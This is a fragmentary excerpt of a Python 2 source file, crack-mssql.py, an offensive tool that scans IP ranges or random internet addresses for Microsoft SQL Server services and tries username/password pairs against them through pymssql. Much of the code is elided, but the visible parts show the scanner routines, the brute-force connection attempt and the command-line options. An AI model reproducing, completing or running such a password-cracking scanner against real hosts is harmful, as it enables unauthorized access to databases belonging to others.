...
# version of crack-mssql.py
VERSION = 'v0.1'


# print our nice banner ;)
def banner():
    print 'crack-mssql.py'

# print version
def version():
    print '[+] crack-mssql.py %s' % (VERSION)
    sys.exit(0)
...
def argspage():
    ...
    options.add_argument('-p', default=1434, metavar='<num>',
            help='port number of mssql (default: 1434)')
    ...
    options.add_argument('-V', action='store_true',
            help='print version of crack-mssql.py and exit')
...
def ip_range(args):
    ...
    print '[*] scanning %s for mssql services' % targets
    counter = 0
...
def rand_ip(args):
    i = 0
    print '[*] scanning random ips for mssql services'
...
def crack(target, port, user, passwd, outfile, timeo, i):
    ...
    db = None
    try:
        db = pymssql.connect(user=user, password=passwd, database="production",
                server=target, port=port, timeout=timeo)
...
# output when crack-mssql.py finished all routines
def finished():
    print '[*] game over!!!'
